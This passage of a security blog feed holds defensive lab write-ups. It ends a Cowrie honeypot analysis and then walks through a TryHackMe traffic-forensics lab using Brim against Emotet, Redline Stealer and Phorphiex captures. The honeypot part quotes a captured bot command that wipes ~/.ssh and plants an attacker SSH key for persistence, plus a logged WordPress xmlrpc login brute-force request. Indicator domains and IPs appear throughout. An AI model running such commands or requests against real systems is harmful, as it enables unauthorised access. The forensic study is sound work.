&lt;p&gt;As we notice, Cowrie will return incorrect values of the Debian version when executing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uname -a&lt;/code&gt; command.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@acmeweb:~# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/issue 
Ubuntu 18.04.5 LTS &lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\l&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# -&amp;gt; Real&lt;/span&gt;

root@acmeweb:~# &lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 
Linux acmeweb 3.2.0-4-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 3.2.68-1+deb7u1 x86_64 GNU/Linux&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Install malicious software using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; commands. However, as we mentioned, Cowrie will prevent bash execution to reduce the risks that a Honeypot might take.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Delete all logs to prevent forensic activities. Cowrie counters that by logging all activities externally.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;identification-techniques&quot;&gt;&lt;strong&gt;Identification Techniques&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;After the target is compromised, bots will execute orders of commands to enumerate the target&lt;/p&gt;

&lt;p&gt;For instance, If we investigate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BotCommands/Sample3.txt&lt;/code&gt; file,&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
cd ~ &amp;amp;&amp;amp; rm -rf .ssh &amp;amp;&amp;amp; mkdir .ssh &amp;amp;&amp;amp; echo &lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&amp;gt;&amp;gt;.ssh/authorized_keys &amp;amp;&amp;amp; chmod -R go= ~/.ssh &amp;amp;&amp;amp; cd ~
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;there is a highly identificable public SSH Key from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Outlaw&lt;/code&gt; group is written into the target system to maintain access.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ssh-tunnelling&quot;&gt;&lt;strong&gt;SSH Tunnelling&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;By default, Cowrie will log and drop all the SSH tunnelling traffic to the destination. This data is beneficial to detect web attacks.&lt;/p&gt;

&lt;p&gt;If we inspect the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Tunnelling/Sample1.txt&lt;/code&gt; log, we can see that attacker targets the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wordpress&lt;/code&gt; website.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Sample1.txt 
2021-03-17T10:09:51.052837Z &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SSHChannel cowrie-discarded-direct-tcpip &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;62&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; on SSHService b&lt;span class=&quot;s1&quot;&gt;&apos;ssh-connection&apos;&lt;/span&gt; on HoneyPotSSHTransport,118939,0.0.0.0] discarded direct-tcp forward request 62 to &amp;lt;A DOMAIN&amp;gt;:80 with data b&lt;span class=&quot;s1&quot;&gt;&apos;POST /xmlrpc.php HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: keep-alive\r\nContent-Length: 201\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: &amp;lt;A DOMAIN&amp;gt;\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36\r\n\r\n&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;methodCall&amp;gt;&amp;lt;methodName&amp;gt;wp.getUsersBlogs&amp;lt;/methodName&amp;gt;&amp;lt;params&amp;gt;&amp;lt;param&amp;gt;&amp;lt;value&amp;gt;admin&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt;&amp;lt;param&amp;gt;&amp;lt;value&amp;gt;password11\r&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt;&amp;lt;/params&amp;gt;&amp;lt;/methodCall&amp;gt;
...
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;To conclude, Cowrie Honeypot is a great example to demonstrate how attacker’s artifacts are collected for digital forensics activities. Yet, we need to be very careful due to potential risks if it’s not properly configured.&lt;/p&gt;</content><author><name></name></author><category term="honeypot" /><category term="blue" /><category term="soc" /><summary type="html">Lab Description</summary></entry><entry><title type="html">Traffic Forensics with Brim</title><link href="https://jayngng.github.io/blog/traffic-forensics-with-brim/" rel="alternate" type="text/html" title="Traffic Forensics with Brim" /><published>2021-10-10T23:37:57+11:00</published><updated>2021-10-10T23:37:57+11:00</updated><id>https://jayngng.github.io/blog/traffic-forensics-with-brim</id><content type="html" xml:base="https://jayngng.github.io/blog/traffic-forensics-with-brim/">&lt;h2 id=&quot;lab-note&quot;&gt;&lt;strong&gt;Lab Note&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;The lab is provided by TryHackMe - Creators: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;heavenraiza&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RussianPanda&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Link to access the lab: &lt;a href=&quot;https://tryhackme.com/room/mastermindsxlq&quot;&gt;Masterminds&lt;/a&gt; (Free lab).&lt;/p&gt;

&lt;p&gt;In this lab, we employ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brim&lt;/code&gt; to perform traffic forensics. More info about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brim&lt;/code&gt; can be found &lt;a href=&quot;https://www.brimdata.io/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Our goal is to answer the questions in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task 2&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task 3&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task 4&lt;/code&gt; of the &lt;a href=&quot;https://tryhackme.com/room/mastermindsxlq&quot;&gt;lab&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;task-2---infection-1&quot;&gt;&lt;strong&gt;Task 2 - [Infection 1]&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. Provide the victim’s IP address.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.75.249&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Query:&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/1.png&quot; title=&quot;brimthm/1.png&quot; alt=&quot;brimthm/1.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2. The victim attempted to make HTTP connections to two suspicious domains with the status ‘404 Not Found’. Provide the hosts/domains requested.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cambiasuhistoria.growlab.es, www.letscompareonline.com&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;http&quot; | cut id.orig_h, id.resp_h, id.resp_p, method,host, uri, status_code | uniq -c&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/2.png&quot; title=&quot;brimthm/2.png&quot; alt=&quot;brimthm/2.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3. The victim made a successful HTTP connection to one of the domains and received the response_body_len of 1,309 (uncompressed content size of the data tr+ Answerferred from the server). Provide the domain and the destination IP address.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ww25.gocphongthe.com,199.59.242.153&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;http&quot; | cut id.orig_h, id.resp_h, id.resp_p, method,host, uri, response_body_len | uniq -c&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/3.png&quot; title=&quot;brimthm/3.png&quot; alt=&quot;brimthm/3.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4. How many unique DNS requests were made to cab[.]myfkn[.]com domain (including the capitalized domain)?&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;7&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;dns&quot; | count() by query | sort -r&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/4.png&quot; title=&quot;brimthm/4.png&quot; alt=&quot;brimthm/4.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;5.Provide the URI of the domain bhaktivrind[.]com that the victim reached out over HTTP.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/JBbb8/&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;http&quot; host==&quot;bhaktivrind.com&quot;&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/5.png&quot; title=&quot;brimthm/5.png&quot; alt=&quot;brimthm/5.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;6. Provide the IP address of the malicious server and the executable that the victim downloaded from the server.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;185.239.243.112,catzx.exe&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;http&quot;&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/6.png&quot; title=&quot;brimthm/6.png&quot; alt=&quot;brimthm/6.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;7. Based on the information gathered from the second question, provide the name of the malware using VirusTotal.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Emotet&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;task-3---infection-2&quot;&gt;&lt;strong&gt;Task 3 - [Infection 2]&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;1. Provide the IP address of the victim machine.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.75.146&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;conn&quot; | cut id.orig_h, id.resp_p, id.resp_h | sort | uniq&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/7.png&quot; title=&quot;brimthm/7.png&quot; alt=&quot;brimthm/7.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2. Provide the IP address the victim made the POST connections to.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5.181.156.252&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;method==&quot;POST&quot; | cut ts, uid, id, method, uri, status_code&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/8.png&quot; title=&quot;brimthm/8.png&quot; alt=&quot;brimthm/8.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3. How many POST connections were made to the IP address in the previous question?&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4. Provide the domain where the binary was downloaded from.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hypercustom.top&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;http&quot; | cut id.orig_h, id.resp_h, id.resp_p, method,host, uri | uniq -c&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/9.png&quot; title=&quot;brimthm/9.png&quot; alt=&quot;brimthm/9.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;5. Provide the name of the binary including the full URI.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jollion/apines.exe&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;6. Provide the IP address of the domain that hosts the binary.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;45.95.203.28&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;7. There were 2 Suricata “A Network Trojan was detected” alerts. What were the source and destination IP addresses?&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.75.146, 45.95.203.28&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;event_type==&quot;alert&quot; | alerts := union(alert.category) by src_ip, dest_ip&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/10.png&quot; title=&quot;brimthm/10.png&quot; alt=&quot;brimthm/10.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;8. Taking a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.top&lt;/code&gt; domain in HTTP requests, provide the name of the stealer (Trojan that gathers information from a system) involved in this packet capture using &lt;a href=&quot;https://urlhaus.abuse.ch/browse/&quot;&gt;URLhaus Database&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Redline Stealer&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;task-4---infection-3&quot;&gt;&lt;strong&gt;Task 4 - [Infection 3]&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;1. Provide the IP address of the victim machine.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.75.232&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;http&quot; | cut id.orig_h, id.resp_h, id.resp_p, method,host, uri | uniq -c&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/11.png&quot; title=&quot;brimthm/11.png&quot; alt=&quot;brimthm/11.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2. Provide three C2 domains from which the binaries were downloaded (starting from the earliest to the latest in the timestamp)&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;efhoahegue.ru,afhoahegue.ru,xfhoahegue.ru&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;http&quot; | cut ts, id.orig_h, id.resp_h, id.resp_p, method,host, uri | uniq -c | sort ts&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/12.png&quot; title=&quot;brimthm/12.png&quot; alt=&quot;brimthm/12.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3. Provide the IP addresses for all three domains in the previous question.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;162.217.98.146, 199.21.76.77, 63.251.106.25&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4. How many unique DNS queries were made to the domain associated from the first IP address from the previous answer?&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;dns&quot; query==&quot;efhoahegue.ru&quot;&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/13.png&quot; title=&quot;brimthm/13.png&quot; alt=&quot;brimthm/13.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;5. How many binaries were downloaded from the above domain in total?&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;http&quot; host==&quot;efhoahegue.ru&quot;&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/14.png&quot; title=&quot;brimthm/14.png&quot; alt=&quot;brimthm/14.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;6. Provided the user-agent listed to download the binaries.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:25.0) Gecko/20100101 Firefox/25.0&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Explanation:&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/15.png&quot; title=&quot;brimthm/15.png&quot; alt=&quot;brimthm/15.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;7. Provide the amount of DNS connections made in total for this packet capture.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;986&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;count() by _path | sort -r&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/16.png&quot; title=&quot;brimthm/16.png&quot; alt=&quot;brimthm/16.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;8. With some OSINT skills, provide the name of the worm using the first domain you have managed to collect from Question 2. (Please use quotation marks for Google searches, don’t use .ru in your search, and DO NOT interact with the domain directly).&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Phorphiex&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Explanation:&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/17.png&quot; title=&quot;brimthm/17.png&quot; alt=&quot;brimthm/17.png&quot; /&gt;
          &lt;/div&gt;</content><author><name></name></author><category term="traffic_analysis" /><category term="blue" /><category term="soc" /><summary type="html">Lab Note The lab is provided by TryHackMe - Creators: heavenraiza &amp;amp; RussianPanda.</summary></entry></feed>